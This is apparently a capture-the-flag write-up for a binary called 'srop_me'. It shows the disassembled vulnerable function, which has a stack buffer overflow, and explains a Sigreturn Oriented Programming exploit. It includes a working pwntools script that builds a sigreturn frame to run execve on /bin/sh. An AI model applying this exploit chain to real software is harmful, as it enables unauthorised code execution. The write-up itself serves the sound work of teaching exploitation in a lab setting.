# ASM

First of all, let's open the file in IDA disassembler
We see very tiny assembly code 
Function *vuln()*:

```asm
vuln proc near
mov     eax, 1
mov     edi, 1          ; fd
mov     rsi, offset msg ; buf
mov     edx, 0Fh        ; count
syscall                 ; LINUX - sys_write
sub     rsp, 20h
mov     eax, 0
mov     edi, 0          ; fd
mov     rsi, rsp        ; buf
mov     edx, 200h       ; count
syscall                 ; LINUX - sys_read
add     rsp, 20h
retn
vuln endp
```

File name is "srop_me", so it's obvious, that we need to use SROP (Sigreturn Oriented Programming).

So our payload contains:
- 32 bytes useless data
- address 0x40101b to read buffer again and make rax = 0xf
- address of syscall to execute syscall with rax = 0xf and control all registers
- and SigreturnFrame to make the register values what we need

Here is the exploit using pwntools:

```python
io  =  start()
io.recvline()

frame  =  SigreturnFrame()
frame.rdi =  0x40200F  # binsh string    
frame.rsi =  0x0
frame.rax =  0x3b  # execve
frame.rdx =  0x0
frame.rbp =  0x402100
frame.rip =  0x401031  # syscall
frame.rsp =  0x402000
    
pl  =  b''
pl  +=  b'A'*32
pl  += p64(0x40101b) # read gadget    
pl  += p64(0x401031) # syscall    
pl  +=  bytes(frame)
    
io.send(pl.ljust(0x200))             
# also we need to send 15 bytes    
# i do it manually via interactive mode
              
io.interactive()
```
